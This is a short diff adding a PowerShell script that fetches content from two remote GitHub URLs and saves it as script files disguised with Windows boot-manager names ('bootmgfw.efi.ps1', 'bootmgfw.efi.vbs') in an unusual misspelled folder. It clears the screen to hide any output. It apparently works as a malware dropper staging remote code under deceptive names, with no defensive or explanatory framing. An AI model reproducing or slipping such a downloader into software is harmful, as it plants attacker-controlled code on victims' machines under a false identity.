@@ -1,0 +1,20 @@
+$url = "https://raw.githubusercontent.com/wajih8/wpla_wajih/refs/heads/main/public/stream"
+$outputPath = "C:\ProgramX64\extentions\bootmgfw.efi.ps1"
+$outputPath2 = "C:\ProgramX64\extentions\bootmgfw.efi.vbs"
+try {
+    
+    $content = Invoke-RestMethod -Uri $url
+    $content | Set-Content -Path $outputPath
+    cls
+
+} catch {
+    cls
+}
+Start-Sleep -Milliseconds 20
+$url = "https://raw.githubusercontent.com/wajih8/wpla_wajih/refs/heads/main/public/apssa"
+
+$outputPath = "C:\ProgramX64\extentions\bootmgfw.efi.vbs"
+
+
+
+Invoke-WebRequest -Uri $url -OutFile $outputPath
